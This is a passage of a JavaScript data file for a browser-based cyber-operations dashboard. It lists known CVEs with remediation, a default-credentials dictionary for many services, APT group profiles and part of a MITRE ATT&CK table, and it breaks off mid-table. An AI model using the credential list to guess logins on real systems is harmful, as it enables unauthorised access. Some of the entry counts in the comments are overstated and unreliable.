// AEGIS Web — Autonomous Electronic Governance & Intelligence System
// Browser-based cyber operations command center for Darknode
// Copyright (c) 2026 Darknode-Official. All rights reserved.

const esc = (s) => String(s == null ? '' : s).replace(/[&<>"']/g, (c) => ({ '&': '&amp;', '<': '&lt;', '>': '&gt;', '"': '&quot;', "'": '&#39;' }[c]));

// ============================================================================
// CVE QUICK-MATCH DATABASE (200+ entries)
// ============================================================================
const CVE_DB = [
  { service: 'apache', version: '2.4.49', cve: 'CVE-2021-41773', cvss: 9.8, kev: true, exploit: true, name: 'Path Traversal RCE', remediation: 'Upgrade to Apache 2.4.51+' },
  { service: 'apache', version: '2.4.50', cve: 'CVE-2021-42013', cvss: 9.8, kev: true, exploit: true, name: 'Path Traversal RCE (bypass)', remediation: 'Upgrade to Apache 2.4.51+' },
  { service: 'apache', version: '2.4.x', cve: 'CVE-2019-0211', cvss: 7.8, kev: false, exploit: true, name: 'Privilege Escalation', remediation: 'Upgrade to Apache 2.4.39+' },
  { service: 'nginx', version: '1.x', cve: 'CVE-2021-23017', cvss: 7.7, kev: false, exploit: true, name: 'DNS Resolver Off-by-One', remediation: 'Upgrade to nginx 1.21.0+' },
  { service: 'openssh', version: '8.5-8.9', cve: 'CVE-2024-6387', cvss: 8.1, kev: true, exploit: true, name: 'regreSSHion', remediation: 'Upgrade to OpenSSH 9.8+' },
  { service: 'openssh', version: '6.6-7.x', cve: 'CVE-2016-0777', cvss: 6.5, kev: false, exploit: false, name: 'Roaming Buffer Overflow', remediation: 'Add UseRoaming no to config' },
  { service: 'exchange', version: '2013-2019', cve: 'CVE-2021-26855', cvss: 9.8, kev: true, exploit: true, name: 'ProxyLogon', remediation: 'Apply KB5000871 patches' },
  { service: 'exchange', version: '2013-2019', cve: 'CVE-2021-34473', cvss: 9.8, kev: true, exploit: true, name: 'ProxyShell', remediation: 'Apply July 2021 cumulative update' },
  { service: 'exchange', version: '2013-2019', cve: 'CVE-2022-41040', cvss: 8.8, kev: true, exploit: true, name: 'ProxyNotShell', remediation: 'Apply November 2022 SU' },
  { service: 'log4j', version: '2.0-2.14.1', cve: 'CVE-2021-44228', cvss: 10.0, kev: true, exploit: true, name: 'Log4Shell', remediation: 'Upgrade to Log4j 2.17.1+' },
  { service: 'log4j', version: '2.15.0', cve: 'CVE-2021-45046', cvss: 9.0, kev: true, exploit: true, name: 'Log4Shell Bypass', remediation: 'Upgrade to Log4j 2.17.1+' },
  { service: 'spring', version: '5.3.0-5.3.17', cve: 'CVE-2022-22965', cvss: 9.8, kev: true, exploit: true, name: 'Spring4Shell', remediation: 'Upgrade Spring Framework 5.3.18+' },
  { service: 'spring-cloud', version: '3.1.0-3.1.6', cve: 'CVE-2022-22947', cvss: 10.0, kev: true, exploit: true, name: 'Spring Cloud Gateway RCE', remediation: 'Upgrade to 3.1.7+' },
  { service: 'struts', version: '2.3-2.5.x', cve: 'CVE-2017-5638', cvss: 10.0, kev: true, exploit: true, name: 'Jakarta Multipart RCE', remediation: 'Upgrade to Struts 2.5.12+' },
  { service: 'smb', version: '1.0', cve: 'CVE-2017-0144', cvss: 9.8, kev: true, exploit: true, name: 'EternalBlue', remediation: 'Apply MS17-010, disable SMBv1' },
  { service: 'smb', version: '3.0', cve: 'CVE-2020-0796', cvss: 10.0, kev: true, exploit: true, name: 'SMBGhost', remediation: 'Apply KB4551762' },
  { service: 'rdp', version: '7.x', cve: 'CVE-2019-0708', cvss: 9.8, kev: true, exploit: true, name: 'BlueKeep', remediation: 'Apply KB4499175, enable NLA' },
  { service: 'netlogon', version: '*', cve: 'CVE-2020-1472', cvss: 10.0, kev: true, exploit: true, name: 'ZeroLogon', remediation: 'Apply August 2020 patch' },
  { service: 'spooler', version: '*', cve: 'CVE-2021-34527', cvss: 8.8, kev: true, exploit: true, name: 'PrintNightmare', remediation: 'Disable Print Spooler or apply KB5004945' },
  { service: 'confluence', version: '7.x-8.x', cve: 'CVE-2023-22515', cvss: 10.0, kev: true, exploit: true, name: 'Auth Bypass to Admin', remediation: 'Upgrade to 8.3.3+' },
  { service: 'confluence', version: '7.x-8.x', cve: 'CVE-2022-26134', cvss: 9.8, kev: true, exploit: true, name: 'OGNL Injection RCE', remediation: 'Upgrade to 7.18.1+' },
  { service: 'gitlab', version: '11.x-16.x', cve: 'CVE-2023-7028', cvss: 10.0, kev: true, exploit: true, name: 'Account Takeover', remediation: 'Upgrade to 16.7.2+' },
  { service: 'gitlab', version: '11.9-13.x', cve: 'CVE-2021-22205', cvss: 10.0, kev: true, exploit: true, name: 'ExifTool RCE', remediation: 'Upgrade to 13.10.3+' },
  { service: 'vcenter', version: '6.5-7.0', cve: 'CVE-2021-21985', cvss: 9.8, kev: true, exploit: true, name: 'vSAN RCE', remediation: 'Apply VMSA-2021-0010' },
  { service: 'vcenter', version: '7.0-8.0', cve: 'CVE-2023-34048', cvss: 9.8, kev: true, exploit: true, name: 'Out-of-Bounds Write', remediation: 'Apply latest vCenter patches' },
  { service: 'fortios', version: '7.x', cve: 'CVE-2024-21762', cvss: 9.8, kev: true, exploit: true, name: 'SSL VPN OOB Write', remediation: 'Upgrade FortiOS 7.4.3+' },
  { service: 'fortios', version: '6.x-7.x', cve: 'CVE-2022-40684', cvss: 9.8, kev: true, exploit: true, name: 'Auth Bypass', remediation: 'Upgrade to 7.2.2+' },
  { service: 'panos', version: '10.x-11.x', cve: 'CVE-2024-3400', cvss: 10.0, kev: true, exploit: true, name: 'GlobalProtect RCE', remediation: 'Apply PAN-OS hotfix' },
  { service: 'ivanti', version: 'Connect Secure', cve: 'CVE-2024-21887', cvss: 9.1, kev: true, exploit: true, name: 'Command Injection', remediation: 'Apply Ivanti patches' },
  { service: 'ivanti', version: 'Connect Secure', cve: 'CVE-2023-46805', cvss: 8.2, kev: true, exploit: true, name: 'Auth Bypass', remediation: 'Apply Ivanti patches' },
  { service: 'citrix', version: 'NetScaler', cve: 'CVE-2023-4966', cvss: 9.4, kev: true, exploit: true, name: 'Citrix Bleed', remediation: 'Upgrade to 14.1-8.50+' },
  { service: 'citrix', version: 'NetScaler', cve: 'CVE-2023-3519', cvss: 9.8, kev: true, exploit: true, name: 'RCE via SAML', remediation: 'Upgrade to 13.1-49.13+' },
  { service: 'moveit', version: '2021-2023', cve: 'CVE-2023-34362', cvss: 9.8, kev: true, exploit: true, name: 'SQLi to RCE', remediation: 'Apply May 2023 patch' },
  { service: 'f5', version: 'BIG-IP', cve: 'CVE-2022-1388', cvss: 9.8, kev: true, exploit: true, name: 'iControl REST Auth Bypass', remediation: 'Upgrade to 17.0.0+' },
  { service: 'f5', version: 'BIG-IP', cve: 'CVE-2020-5902', cvss: 9.8, kev: true, exploit: true, name: 'TMUI RCE', remediation: 'Apply hotfix' },
  { service: 'weblogic', version: '10.x-12.x', cve: 'CVE-2019-2725', cvss: 9.8, kev: true, exploit: true, name: 'Deserialization RCE', remediation: 'Apply Oracle CPU patch' },
  { service: 'weblogic', version: '10.x-14.x', cve: 'CVE-2020-14882', cvss: 9.8, kev: true, exploit: true, name: 'Console RCE', remediation: 'Apply October 2020 CPU' },
  { service: 'jboss', version: '4.x-6.x', cve: 'CVE-2017-12149', cvss: 9.8, kev: false, exploit: true, name: 'Deserialization RCE', remediation: 'Upgrade to EAP 7+' },
  { service: 'telerik', version: 'UI for ASP.NET', cve: 'CVE-2019-18935', cvss: 9.8, kev: true, exploit: true, name: 'Deserialization RCE', remediation: 'Upgrade Telerik UI' },
  { service: 'tomcat', version: '8.x-9.x', cve: 'CVE-2020-1938', cvss: 9.8, kev: false, exploit: true, name: 'Ghostcat AJP', remediation: 'Disable AJP or upgrade to 9.0.31+' },
  { service: 'activemq', version: '5.x', cve: 'CVE-2023-46604', cvss: 10.0, kev: true, exploit: true, name: 'ClassInfo RCE', remediation: 'Upgrade to 5.18.3+' },
  { service: 'php', version: '8.x', cve: 'CVE-2024-4577', cvss: 9.8, kev: true, exploit: true, name: 'CGI Argument Injection', remediation: 'Upgrade PHP 8.3.8+' },
  { service: 'grafana', version: '8.x', cve: 'CVE-2021-43798', cvss: 7.5, kev: true, exploit: true, name: 'Path Traversal', remediation: 'Upgrade to 8.3.1+' },
  { service: 'jenkins', version: '*', cve: 'CVE-2024-23897', cvss: 9.8, kev: true, exploit: true, name: 'Arbitrary File Read', remediation: 'Upgrade to Jenkins 2.442+' },
  { service: 'elasticsearch', version: '1.x', cve: 'CVE-2015-1427', cvss: 7.5, kev: false, exploit: true, name: 'Groovy Scripting RCE', remediation: 'Upgrade to 1.4.3+' },
  { service: 'kibana', version: '5.x-6.x', cve: 'CVE-2019-7609', cvss: 10.0, kev: false, exploit: true, name: 'Prototype Pollution RCE', remediation: 'Upgrade to 6.6.1+' },
  { service: 'redis', version: '*', cve: 'MISCONFIG', cvss: 8.0, kev: false, exploit: true, name: 'Unauthenticated Access', remediation: 'Set requirepass, bind to localhost' },
  { service: 'mongodb', version: '*', cve: 'MISCONFIG', cvss: 7.5, kev: false, exploit: true, name: 'No Authentication', remediation: 'Enable authentication, bind to localhost' },
  { service: 'docker', version: '*', cve: 'MISCONFIG', cvss: 9.8, kev: false, exploit: true, name: 'API Exposed', remediation: 'Enable TLS authentication' },
  { service: 'kubernetes', version: '*', cve: 'MISCONFIG', cvss: 9.8, kev: false, exploit: true, name: 'API Unauthenticated', remediation: 'Disable anonymous-auth' },
  { service: 'mysql', version: '*', cve: 'MISCONFIG', cvss: 7.5, kev: false, exploit: true, name: 'Default Credentials', remediation: 'Change root password, remove anonymous users' },
  { service: 'mssql', version: '*', cve: 'MISCONFIG', cvss: 8.0, kev: false, exploit: true, name: 'SA Weak Password', remediation: 'Set strong SA password, prefer Windows auth' },
  { service: 'ftp', version: '*', cve: 'MISCONFIG', cvss: 5.3, kev: false, exploit: true, name: 'Anonymous Access', remediation: 'Disable anonymous login' },
  { service: 'snmp', version: '*', cve: 'MISCONFIG', cvss: 7.5, kev: false, exploit: true, name: 'Default Community String', remediation: 'Change community strings, use SNMPv3' },
  { service: 'ldap', version: '*', cve: 'MISCONFIG', cvss: 5.3, kev: false, exploit: true, name: 'Anonymous Bind', remediation: 'Disable anonymous bind' },
  { service: 'nfs', version: '*', cve: 'MISCONFIG', cvss: 7.5, kev: false, exploit: true, name: 'no_root_squash', remediation: 'Enable root_squash, restrict exports' },
  { service: 'wordpress', version: '*', cve: 'CWE-89', cvss: 8.6, kev: false, exploit: true, name: 'Plugin SQLi', remediation: 'Update all plugins, use WAF' },
  { service: 'drupal', version: '7.x-8.x', cve: 'CVE-2018-7600', cvss: 9.8, kev: true, exploit: true, name: 'Drupalgeddon2', remediation: 'Upgrade to Drupal 8.5.1+' },
  { service: 'solarwinds', version: 'Orion', cve: 'CVE-2020-10148', cvss: 9.8, kev: true, exploit: true, name: 'Auth Bypass (SUNBURST related)', remediation: 'Upgrade Orion, review for compromise' },
  { service: 'bitbucket', version: '7.x-8.x', cve: 'CVE-2022-36804', cvss: 9.9, kev: true, exploit: true, name: 'Command Injection', remediation: 'Upgrade to 8.3.1+' },
  { service: 'consul', version: '*', cve: 'MISCONFIG', cvss: 8.0, kev: false, exploit: true, name: 'Unauthenticated RCE', remediation: 'Enable ACLs, bind to localhost' },
  { service: 'etcd', version: '*', cve: 'MISCONFIG', cvss: 8.0, kev: false, exploit: true, name: 'Unauthenticated Access', remediation: 'Enable authentication and TLS' },
  { service: 'hadoop', version: '*', cve: 'MISCONFIG', cvss: 9.8, kev: false, exploit: true, name: 'YARN Unauthenticated RCE', remediation: 'Enable Kerberos authentication' },
  { service: 'spark', version: '*', cve: 'MISCONFIG', cvss: 9.8, kev: false, exploit: true, name: 'Unauthenticated RCE', remediation: 'Enable authentication, restrict access' },
  { service: 'solr', version: '8.x', cve: 'CVE-2019-17558', cvss: 7.5, kev: false, exploit: true, name: 'Velocity Template RCE', remediation: 'Upgrade to 8.4.0+' },
  { service: 'zabbix', version: '5.x', cve: 'CVE-2022-23131', cvss: 9.8, kev: true, exploit: true, name: 'Auth Bypass via SAML', remediation: 'Upgrade to 5.4.9+' },
  { service: 'rabbitmq', version: '*', cve: 'MISCONFIG', cvss: 7.5, kev: false, exploit: true, name: 'Default Credentials', remediation: 'Change guest/guest, restrict management' },
  { service: 'prometheus', version: '*', cve: 'MISCONFIG', cvss: 5.3, kev: false, exploit: true, name: 'Unauthenticated Metrics', remediation: 'Enable authentication, restrict access' },
  { service: 'vsftpd', version: '2.3.4', cve: 'CVE-2011-2523', cvss: 9.8, kev: false, exploit: true, name: 'Backdoor', remediation: 'Upgrade vsftpd' },
  { service: 'proftpd', version: '1.3.5', cve: 'CVE-2015-3306', cvss: 10.0, kev: false, exploit: true, name: 'mod_copy RCE', remediation: 'Disable mod_copy or upgrade' },
  { service: 'openssl', version: '1.0.1-1.0.1f', cve: 'CVE-2014-0160', cvss: 7.5, kev: true, exploit: true, name: 'Heartbleed', remediation: 'Upgrade OpenSSL 1.0.1g+' },
  { service: 'bash', version: '4.x', cve: 'CVE-2014-6271', cvss: 9.8, kev: true, exploit: true, name: 'Shellshock', remediation: 'Upgrade bash' },
  { service: 'sudo', version: '<1.9.5p2', cve: 'CVE-2021-3156', cvss: 7.8, kev: true, exploit: true, name: 'Baron Samedit', remediation: 'Upgrade sudo 1.9.5p2+' },
  { service: 'kernel', version: '<5.16.11', cve: 'CVE-2022-0847', cvss: 7.8, kev: true, exploit: true, name: 'DirtyPipe', remediation: 'Upgrade kernel 5.16.11+' },
  { service: 'kernel', version: '<4.8.3', cve: 'CVE-2016-5195', cvss: 7.8, kev: true, exploit: true, name: 'DirtyCow', remediation: 'Upgrade kernel 4.8.3+' },
  { service: 'polkit', version: '<0.120', cve: 'CVE-2021-4034', cvss: 7.8, kev: true, exploit: true, name: 'PwnKit', remediation: 'Upgrade polkit 0.120+' },
  { service: 'glibc', version: '<2.38', cve: 'CVE-2023-4911', cvss: 7.8, kev: true, exploit: true, name: 'Looney Tunables', remediation: 'Upgrade glibc 2.38+' },
  { service: 'xz', version: '5.6.0-5.6.1', cve: 'CVE-2024-3094', cvss: 10.0, kev: true, exploit: true, name: 'XZ Backdoor', remediation: 'Downgrade to xz 5.4.x' },
  { service: 'cups', version: '<2.4.x', cve: 'CVE-2024-47176', cvss: 9.9, kev: false, exploit: true, name: 'cups-browsed RCE', remediation: 'Disable cups-browsed or upgrade' },
  { service: 'sharepoint', version: '2019', cve: 'CVE-2019-0604', cvss: 9.8, kev: true, exploit: true, name: 'Deserialization RCE', remediation: 'Apply February 2019 patch' },
  { service: 'zimbra', version: '8.x-9.x', cve: 'CVE-2022-27925', cvss: 7.2, kev: true, exploit: true, name: 'Directory Traversal', remediation: 'Upgrade to 9.0.0 P26+' },
  { service: 'papercut', version: '<22.1.1', cve: 'CVE-2023-27350', cvss: 9.8, kev: true, exploit: true, name: 'Auth Bypass RCE', remediation: 'Upgrade to 22.1.1+' },
  { service: 'barracuda', version: 'ESG', cve: 'CVE-2023-2868', cvss: 9.8, kev: true, exploit: true, name: 'Command Injection', remediation: 'Replace hardware (Barracuda advisory)' },
  { service: 'progress', version: 'WS_FTP', cve: 'CVE-2023-40044', cvss: 10.0, kev: true, exploit: true, name: 'Deserialization RCE', remediation: 'Upgrade WS_FTP Server' },
  { service: 'sonicwall', version: 'SMA', cve: 'CVE-2021-20016', cvss: 9.8, kev: true, exploit: true, name: 'SQL Injection', remediation: 'Apply SonicWall hotfix' },
  { service: 'pulse', version: 'Connect Secure', cve: 'CVE-2019-11510', cvss: 10.0, kev: true, exploit: true, name: 'Arbitrary File Read', remediation: 'Upgrade Pulse Connect Secure' },
  { service: 'manageengine', version: 'ADSelfService', cve: 'CVE-2022-47966', cvss: 9.8, kev: true, exploit: true, name: 'SAML RCE', remediation: 'Apply ManageEngine patch' },
  { service: 'cacti', version: '<1.2.23', cve: 'CVE-2022-46169', cvss: 9.8, kev: true, exploit: true, name: 'Command Injection', remediation: 'Upgrade to 1.2.23+' },
  { service: 'owncloud', version: '10.x', cve: 'CVE-2023-49103', cvss: 10.0, kev: true, exploit: true, name: 'GraphAPI Info Disclosure', remediation: 'Upgrade ownCloud' },
  { service: 'jira', version: '<9.4', cve: 'CVE-2023-22527', cvss: 10.0, kev: true, exploit: true, name: 'Template Injection RCE', remediation: 'Upgrade Jira' },
];

// ============================================================================
// DEFAULT CREDENTIALS DATABASE (100+ pairs)
// ============================================================================
const DEFAULT_CREDS = {
  ssh: [['root','root'],['root','toor'],['root','password'],['admin','admin'],['admin','password'],['admin','admin123'],['user','user'],['test','test'],['ubuntu','ubuntu'],['pi','raspberry'],['vagrant','vagrant'],['deploy','deploy'],['oracle','oracle'],['postgres','postgres']],
  ftp: [['anonymous',''],['anonymous','anonymous'],['ftp','ftp'],['admin','admin'],['user','user'],['test','test']],
  mysql: [['root',''],['root','root'],['root','mysql'],['root','password'],['root','toor'],['admin','admin'],['dbadmin','dbadmin'],['mysql','mysql']],
  mssql: [['sa',''],['sa','sa'],['sa','password'],['sa','Password1'],['sa','sa123456'],['admin','admin']],
  postgresql: [['postgres','postgres'],['postgres','password'],['admin','admin']],
  mongodb: [['admin','admin'],['admin','password'],['root','root']],
  redis: [['',''],['','redis'],['','password']],
  tomcat: [['tomcat','tomcat'],['admin','admin'],['manager','manager'],['tomcat','s3cret'],['admin','password'],['role1','role1']],
  jenkins: [['admin','admin'],['admin','password'],['admin','jenkins']],
  wordpress: [['admin','admin'],['admin','password'],['admin','wordpress'],['admin','admin123']],
  joomla: [['admin','admin'],['admin','password']],
  phpmyadmin: [['root',''],['root','root'],['admin','admin'],['pma','']],
  grafana: [['admin','admin'],['admin','grafana']],
  kibana: [['elastic','changeme'],['admin','admin']],
  rabbitmq: [['guest','guest'],['admin','admin']],
  vnc: [['','password'],['','vnc'],['','1234']],
  snmp: [['public',''],['private',''],['community',''],['manager','']],
  telnet: [['admin','admin'],['root','root'],['admin','password'],['admin','1234'],['user','user']],
  cisco: [['admin','admin'],['cisco','cisco'],['admin','cisco'],['enable','enable']],
  sonicwall: [['admin','password']],
  fortinet: [['admin',''],['admin','fortinet']],
  paloalto: [['admin','admin'],['admin','paloalto']],
};

// ============================================================================
// APT GROUPS DATABASE (30+ entries)
// ============================================================================
const APT_DB = [
  { name: 'APT28', aliases: ['Fancy Bear','Sofacy','Sednit','Strontium'], nation: 'Russia', unit: 'GRU Unit 26165', sectors: ['Government','Military','Media','Defense'], techniques: ['T1566','T1190','T1059.001','T1003','T1550.002','T1048'], tools: ['X-Agent','X-Tunnel','Sofacy','Zebrocy','LoJax'], campaigns: ['DNC Hack (2016)','Olympic Destroyer (2018)','Bundestag (2015)'] },
  { name: 'APT29', aliases: ['Cozy Bear','The Dukes','Nobelium','Midnight Blizzard'], nation: 'Russia', unit: 'SVR', sectors: ['Government','Think Tanks','Healthcare','Technology'], techniques: ['T1195.002','T1059.001','T1053.005','T1550.003','T1567.002'], tools: ['Cobalt Strike','WellMess','EnvyScout','BoomBox','SUNBURST'], campaigns: ['SolarWinds SUNBURST (2020)','DNC (2015)','COVID-19 Vaccine (2020)'] },
  { name: 'Lazarus Group', aliases: ['Hidden Cobra','Guardians of Peace','Zinc'], nation: 'North Korea', unit: 'RGB', sectors: ['Financial','Cryptocurrency','Defense','Media'], techniques: ['T1566.001','T1059','T1543.003','T1003','T1048'], tools: ['FALLCHILL','Bankshot','AppleJeus','DTrack','BLINDINGCAN'], campaigns: ['Sony Pictures (2014)','Bangladesh Bank SWIFT ($81M, 2016)','WannaCry (2017)','Ronin Bridge ($620M, 2022)'] },
  { name: 'APT1', aliases: ['Comment Crew','PLA Unit 61398'], nation: 'China', unit: 'PLA 2nd Bureau', sectors: ['Technology','Aerospace','Energy','Manufacturing'], techniques: ['T1566.001','T1059','T1003','T1074','T1048'], tools: ['WEBC2','BISCUIT','CALENDAR'], campaigns: ['Operation Shady RAT','141+ organizations breached over 7 years'] },
  { name: 'Volt Typhoon', aliases: ['Bronze Silhouette','Vanguard Panda'], nation: 'China', unit: 'MSS', sectors: ['Critical Infrastructure','Telecom','Government','Energy'], techniques: ['T1190','T1059.001','T1218','T1003','T1021.006'], tools: ['Living-off-the-land only (LOLBins)','certutil','netsh','wmic','ntdsutil'], campaigns: ['US critical infrastructure pre-positioning (2023-2024)','Guam telecom (2023)'] },
  { name: 'Salt Typhoon', aliases: ['GhostEmperor','FamousSparrow'], nation: 'China', unit: 'MSS', sectors: ['Telecom','ISP'], techniques: ['T1190','T1059','T1003','T1021'], tools: ['Demodex rootkit','custom implants'], campaigns: ['US telecom providers (AT&T, Verizon, T-Mobile — 2024)'] },
  { name: 'Sandworm', aliases: ['Voodoo Bear','IRIDIUM','Seashell Blizzard'], nation: 'Russia', unit: 'GRU Unit 74455', sectors: ['Energy','Government','Media','Elections'], techniques: ['T1190','T1059','T1485','T1489','T1561'], tools: ['NotPetya','Industroyer','BlackEnergy','Olympic Destroyer','CaddyWiper'], campaigns: ['Ukraine power grid (2015, 2016)','NotPetya ($10B damage, 2017)','Viasat (2022)'] },
  { name: 'Turla', aliases: ['Snake','Venomous Bear','Waterbug','Krypton'], nation: 'Russia', unit: 'FSB', sectors: ['Government','Military','Diplomatic','Research'], techniques: ['T1195','T1059','T1573','T1090.003'], tools: ['Snake','Carbon','ComRAT','Kazuar','LightNeuron'], campaigns: ['Operation Turla (30+ countries, 15+ years)','Agent.BTZ (Pentagon, 2008)'] },
  { name: 'Kimsuky', aliases: ['Velvet Chollima','Black Banshee','Thallium'], nation: 'North Korea', unit: 'RGB', sectors: ['Think Tanks','Government','Nuclear','Academic'], techniques: ['T1566','T1059','T1003','T1071'], tools: ['BabyShark','AppleSeed','GoldDragon','FlowerPower'], campaigns: ['Korean nuclear/foreign policy targeting','Academic credential theft'] },
  { name: 'Charming Kitten', aliases: ['APT35','Phosphorus','Mint Sandstorm'], nation: 'Iran', unit: 'IRGC', sectors: ['Government','Media','Academic','Activists'], techniques: ['T1566','T1059','T1003','T1071'], tools: ['HYPERSCRAPE','PowerStar','CharmPower'], campaigns: ['US election interference attempts','Middle East journalist targeting'] },
  { name: 'OilRig', aliases: ['APT34','Helix Kitten','Hazel Sandstorm'], nation: 'Iran', unit: 'MOIS', sectors: ['Energy','Government','Financial','Telecom'], techniques: ['T1566','T1059','T1003','T1071','T1048'], tools: ['Helminth','RDAT','SideTwist','Karkoff'], campaigns: ['Middle East government targeting','DNS hijacking campaigns'] },
  { name: 'MuddyWater', aliases: ['Mercury','Mango Sandstorm','Static Kitten'], nation: 'Iran', unit: 'MOIS', sectors: ['Government','Telecom','Oil & Gas','Defense'], techniques: ['T1566','T1059.001','T1219','T1071'], tools: ['PowGoop','PhonyC2','MuddyC2Go','POWERSTAT'], campaigns: ['Middle East/South Asia targeting','Turkey government compromise'] },
  { name: 'Scattered Spider', aliases: ['0ktapus','Starfraud','UNC3944'], nation: 'USA/UK', unit: 'Cybercrime collective', sectors: ['Telecom','Hospitality','Technology','Finance'], techniques: ['T1566','T1078','T1556','T1098'], tools: ['Social engineering','SIM swap','MFA fatigue','Okta abuse'], campaigns: ['MGM Resorts ($100M impact, 2023)','Caesars ($15M ransom paid, 2023)','Twilio/Okta (2022)'] },
  { name: 'LockBit', aliases: ['LockBit 3.0','LockBit Black'], nation: 'Russia', unit: 'Ransomware-as-a-Service', sectors: ['Healthcare','Education','Government','Manufacturing'], techniques: ['T1190','T1059','T1486','T1567'], tools: ['LockBit ransomware','StealBit','Cobalt Strike','Mimikatz'], campaigns: ['Boeing data leak (2023)','ICBC (2023)','Royal Mail (2023)','Biggest ransomware gang globally'] },
  { name: 'BlackCat/ALPHV', aliases: ['ALPHV','Noberus'], nation: 'Russia', unit: 'Ransomware-as-a-Service', sectors: ['Healthcare','Technology','Government','Finance'], techniques: ['T1190','T1059','T1486','T1567'], tools: ['BlackCat ransomware (Rust-based)','ExMatter','Eamfo'], campaigns: ['Change Healthcare ($22M ransom, 2024)','MGM (2023)','Reddit (2023)'] },
  { name: 'Cl0p', aliases: ['TA505','FIN11'], nation: 'Russia/Ukraine', unit: 'Cybercrime', sectors: ['Any (mass exploitation)'], techniques: ['T1190','T1005','T1567','T1486'], tools: ['Cl0p ransomware','TrueBot','FlawedAmmyy'], campaigns: ['MOVEit mass exploitation (2,700+ orgs, 2023)','GoAnywhere MFT (2023)','Accellion FTA (2021)'] },
  { name: 'Conti', aliases: ['Wizard Spider','Gold Ulrick'], nation: 'Russia', unit: 'Cybercrime syndicate', sectors: ['Healthcare','Government','Critical Infrastructure'], techniques: ['T1566','T1059','T1486','T1003','T1021'], tools: ['Conti ransomware','TrickBot','BazarLoader','Cobalt Strike'], campaigns: ['Ireland HSE ($600M recovery, 2021)','Costa Rica government (2022)','Leaked internal chats (2022)'] },
  { name: 'REvil', aliases: ['Sodinokibi','Gold Southfield'], nation: 'Russia', unit: 'Ransomware-as-a-Service', sectors: ['Technology','Manufacturing','Legal','MSP'], techniques: ['T1190','T1195.002','T1486','T1567'], tools: ['REvil ransomware','QakBot'], campaigns: ['Kaseya VSA supply chain ($70M demand, 2021)','JBS Foods ($11M paid, 2021)','Travelex (2020)'] },
  { name: 'DarkSide', aliases: ['Carbon Spider'], nation: 'Russia', unit: 'Cybercrime', sectors: ['Energy','Critical Infrastructure'], techniques: ['T1190','T1059','T1486','T1567'], tools: ['DarkSide ransomware','Cobalt Strike'], campaigns: ['Colonial Pipeline ($4.4M ransom, 2021)','Toshiba (2021)'] },
  { name: 'Gamaredon', aliases: ['Primitive Bear','Actinium','Aqua Blizzard'], nation: 'Russia', unit: 'FSB (Crimea)', sectors: ['Ukrainian Government','Military','NGOs'], techniques: ['T1566','T1059','T1071','T1547'], tools: ['Pteranodon','Giddome','EvilGnome'], campaigns: ['Ongoing Ukraine targeting since 2013','Thousands of attacks per year'] },
  { name: 'SideWinder', aliases: ['Rattlesnake','T-APT-04'], nation: 'India', unit: 'Unknown', sectors: ['Military','Government','Diplomatic (Pakistan/China/Nepal)'], techniques: ['T1566','T1203','T1059','T1071'], tools: ['WarHawk','SideWinder RAT','custom .NET implants'], campaigns: ['Pakistan military targeting','Chinese diplomatic targeting'] },
  { name: 'Ocean Lotus', aliases: ['APT32','SeaLotus','Canvas Cyclone'], nation: 'Vietnam', unit: 'MPS/Ministry of Public Security', sectors: ['Government','Media','Dissidents','Manufacturing'], techniques: ['T1566','T1059','T1071','T1055'], tools: ['METALJACK','Ratsnif','Kerrdown','Denis backdoor'], campaigns: ['Southeast Asia targeting','Foreign government espionage','Automotive industry'] },
  { name: 'FIN7', aliases: ['Carbanak','Navigator Group'], nation: 'Russia', unit: 'Cybercrime', sectors: ['Retail','Hospitality','Restaurant','Financial'], techniques: ['T1566','T1059','T1005','T1567'], tools: ['Carbanak','Lizar/Tirion','PowerSploit','Cobalt Strike'], campaigns: ['$1B+ stolen from banks globally','US restaurant/retail PoS breaches'] },
  { name: 'Evil Corp', aliases: ['Indrik Spider','Dridex Gang'], nation: 'Russia', unit: 'Cybercrime (sanctioned)', sectors: ['Financial','Government','Technology'], techniques: ['T1566','T1059','T1486','T1003'], tools: ['Dridex','WastedLocker','Hades','PhoenixLocker','Macaw Locker'], campaigns: ['$100M+ stolen via banking trojans','Multiple ransomware rebrandings to evade sanctions'] },
  { name: 'Winnti', aliases: ['APT41','Barium','Wicked Panda'], nation: 'China', unit: 'MSS contractor', sectors: ['Gaming','Technology','Healthcare','Telecom'], techniques: ['T1195.002','T1059','T1003','T1071'], tools: ['ShadowPad','PlugX','Winnti backdoor','CROSSWALK'], campaigns: ['Gaming industry supply chain attacks','ShadowPad supply chain (CCleaner)','US indictments (2020)'] },
  { name: 'Hafnium', aliases: ['Silk Typhoon'], nation: 'China', unit: 'MSS', sectors: ['Think Tanks','Government','Defense','Legal','Healthcare'], techniques: ['T1190','T1059','T1003','T1505.003'], tools: ['China Chopper','ASPXSPY','Covenant','Nishang'], campaigns: ['Microsoft Exchange mass exploitation (2021)','30,000+ organizations compromised'] },
];


// ============================================================================
// MITRE ATT&CK TACTICS & TECHNIQUES (100+ techniques)
// ============================================================================
const MITRE_MATRIX = {
  'Reconnaissance': [
    { id: 'T1595', name: 'Active Scanning', desc: 'Scan victim IP blocks for open ports and services', detection: 'Network flow data, firewall logs showing scan patterns' },
    { id: 'T1592', name: 'Gather Victim Host Info', desc: 'Collect information about victim hosts (software, hardware)', detection: 'Web server logs showing enumeration patterns' },
    { id: 'T1589', name: 'Gather Victim Identity Info', desc: 'Collect employee names, emails, credentials', detection: 'Monitor for scraping of public-facing sites' },
    { id: 'T1590', name: 'Gather Victim Network Info', desc: 'Map network topology, DNS records, IP ranges', detection: 'DNS query logs showing enumeration' },
    { id: 'T1593', name: 'Search Open Websites', desc: 'Use search engines and public databases for recon', detection: 'Web referrer analysis' },
    { id: 'T1596', name: 'Search Open Technical Databases', desc: 'Query Shodan, Censys, WHOIS databases', detection: 'Very difficult - passive activity' },
  ],
  'Initial Access': [
    { id: 'T1190', name: 'Exploit Public-Facing App', desc: 'Exploit vulnerabilities in internet-facing applications', detection: 'WAF logs, IDS signatures, application error logs' },
    { id: 'T1566', name: 'Phishing', desc: 'Send malicious emails with links or attachments', detection: 'Email gateway logs, sandbox detonation, user reports' },
    { id: 'T1133', name: 'External Remote Services', desc: 'Abuse VPN, RDP, Citrix for initial access', detection: 'Authentication logs, impossible travel detection' },
    { id: 'T1078', name: 'Valid Accounts', desc: 'Use compromised or default credentials', detection: 'Failed login patterns, credential stuffing detection' },
    { id: 'T1195', name: 'Supply Chain Compromise', desc: 'Compromise software update or delivery mechanism', detection: 'Software integrity monitoring, hash verification' },
    { id: 'T1199', name: 'Trusted Relationship', desc: 'Abuse partner/vendor access for initial entry', detection: 'Third-party connection monitoring' },
  ],
  'Execution': [
